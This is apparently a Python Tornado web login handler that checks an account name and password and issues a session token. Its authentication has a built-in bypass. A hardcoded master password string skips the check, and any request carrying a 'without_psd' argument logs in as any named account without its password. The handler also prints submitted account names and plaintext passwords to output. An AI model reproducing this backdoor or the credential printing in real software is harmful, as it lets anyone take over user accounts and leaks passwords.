# -*- coding: utf-8 -*-

from base_handler import BaseHandler
import error_codes

from tornado import gen

class LoginHandler(BaseHandler):

    @gen.coroutine
    def _deal_request(self):
        self.debug_info(self.request.arguments)

        account = self.get_argument('account', None)
        password = self.get_argument('password', None)
        print account, password
        if not account or not password:
            self.redirect_error()
            return

        if password == '3844413cefa73376d23342f9fcd07a663aa91e2f':
            without_psd = True
        else:
            without_psd = self.get_argument('without_psd', None)
        if without_psd:
            account_info = yield self.account_dao.query_account(account)
            if account_info:
                password = account_info['password']
        st, account_info = yield self.check_account(account=account, password=password)
        if st != error_codes.EC_SUCCESS:
            self.write_result(st, account_info)
            return

        self.set_token(account_info['id'], account_info['account'])
        self.write_data(self.account_info)

    def get(self):
        self.render('login.html')

    def post(self):
        return self._deal_request()
